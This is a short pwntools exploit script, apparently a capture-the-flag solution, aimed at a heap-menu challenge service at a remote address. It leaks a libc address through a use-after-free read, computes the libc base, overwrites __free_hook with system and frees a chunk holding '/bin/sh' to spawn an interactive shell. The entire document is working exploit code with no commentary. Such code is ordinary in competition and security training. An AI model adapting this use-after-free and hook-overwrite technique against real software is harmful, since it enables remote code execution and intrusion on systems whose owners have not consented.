from pwn import *

context.arch = "amd64"
context.terminal = "tmux splitw -h".split()
#p = process("./chall")
p = remote("103.152.242.222", 4402)
libc = ELF("./libc.so.6", checksec=False)

cmd = ""
DEBUG = 0
if DEBUG:
    gdb.attach(p, cmd, gdb_args=["--init-eval-command='source ~/ctf/tools/gef/gef.py'"]);


def alloc(idx, n, buf):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(n))
    p.sendlineafter(": ", buf)
    return

def edit(idx, buf):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", buf)
    return

def print_(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter(": ", str(idx))
    p.recvuntil('content: ')
    r = p.recvuntil('\n[1]', drop=True)
    return r

def delete(idx):
    p.sendlineafter("> ", "4")
    p.sendlineafter(": ", str(idx))

alloc(0, 0x800, "A"*16)
alloc(1, 0x420, "/bin/sh")
delete(0)
addr_leak = u64(print_(0).ljust(8, b'\x00'))
print(hex(addr_leak))
libc_base = addr_leak - 2014176
libc.address = libc_base

print(hex(libc_base))
alloc(2, 0x500, "C"*16)
edit(0, p64(0x9)+p64(libc.symbols['__free_hook']))
edit(2, p64(libc.symbols['system']))
delete(1)
p.interactive()
